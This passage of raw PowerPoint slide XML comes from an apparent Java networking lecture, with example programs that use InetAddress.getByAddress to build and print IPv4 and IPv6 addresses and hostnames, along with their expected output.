              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Exception{</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>byte ip[] = new byte[] { (byte) 141, (byte) 146, (byte) 8, (byte) 66};</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress address1 = InetAddress.getByAddress(ip);</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress address2 = InetAddress.getByAddress("Oracle </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>官方网站</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>", ip); </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println(address1);</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println(address2);</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="34818"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33373"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="457200" y="5029200"/>
            <a:ext cx="6307953" cy="9646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8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P spid="6"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152400" y="243512"/>
            <a:ext cx="11963400" cy="6001643"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>java.net.InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>public class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>GetByAddressExample</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>    public static void main(String[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>) throws Exception {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>        byte[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>ipAddr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> = new byte[] { (byte) 142, (byte) 250, (byte) 190, (byte) 46 };</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> // Google's IP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> address = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>InetAddress.getByAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>ipAddr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>("IP: " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>address.getHostAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>());  // 142.250.190.46</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>("Hostname: " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>address.getHostName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>()); </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>				// May return IP if no reverse DNS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Output:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IP: 142.250.190.46</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hostname: 142.250.190.46 (or a reverse-DNS name if available)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="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304800" y="612845"/>
            <a:ext cx="11485034" cy="5262979"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>java.net.InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>public class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>GetByAddressWithHost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>    public static void main(String[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>) throws Exception {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>        byte[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>ipAddr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> = new byte[] { (byte) 192, (byte) 168, 1, 1 };</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> address = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>InetAddress.getByAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>myrouter.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>", </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>ipAddr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>("IP: " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>address.getHostAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>()); </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>// 192.168.1.1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>("Hostname: " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>address.getHostName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>()); </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>myrouter.local</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Output:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IP: 192.168.1.1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hostname: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>myrouter.local</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="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228600" y="895290"/>
            <a:ext cx="11734800" cy="5324535"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>java.net.InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>public class IPv6Example {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>    public static void main(String[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>) throws Exception {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>       </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> byte[] ipv6Addr = new byte[] {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>            (byte) 0x26, (byte) 0x07, (byte) 0xF8, (byte) 0xB0,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>            (byte) 0x40, (byte) 0x09, (byte) 0x80, (byte) 0xE0,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>            (byte) 0x00, (byte) 0x00, (byte) 0x20, (byte) 0x0E</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>        };</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> address = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>InetAddress.getByAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>("ipv6.google.com", ipv6Addr);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>("IPv6: " + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>address.getHostAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>());</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Output:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>IPv6: 2607:f8b0:4009:80e0::200e</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1576917" y="106025"/>
            <a:ext cx="8686800" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
